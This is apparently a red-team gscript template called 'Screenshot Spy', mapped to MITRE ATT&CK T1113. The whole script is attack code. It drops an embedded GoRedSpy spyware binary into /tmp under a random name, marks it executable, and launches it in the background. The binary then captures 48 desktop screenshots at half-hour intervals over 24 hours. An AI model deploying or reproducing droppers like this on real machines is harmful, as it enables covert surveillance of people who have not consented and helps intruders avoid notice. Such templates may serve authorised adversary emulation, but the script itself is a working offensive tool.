// Example gscript template
// Title: Screenshot Spy
// Author: ahhh
// Purpose: Takes screenshots of the desktop every halfhour for the next 24 hours (48 x 1800)
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1113
// Using GoRedSpy to take screenshots: https://github.com/ahhh/GoRedSpy

//priority:150
//timeout:150
//import:/private/tmp/GoRedSpy.elf


function BeforeDeploy() {
  LogInfo("Starting GoRedSpy");
  return true; 
}

function Deploy() {  
  // Drop the sample
  var spy = Asset("GoRedSpy.elf");
  var name = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < 5; i++)
    name += possible.charAt(Math.floor(Math.random() * possible.length));
  name = "/tmp/"+name;
  WriteFile(name, spy.fileData, 0755);
  LogInfo("dropped the spy binary here: "+name);
    
  ForkExecuteCommand(name, ["-outDir", "/tmp/", "-count", "48", "-delay", "1800s"]);
  return true;
}

function AfterDeploy() {
  LogInfo("Done GoRedSpy");
  return true;
}
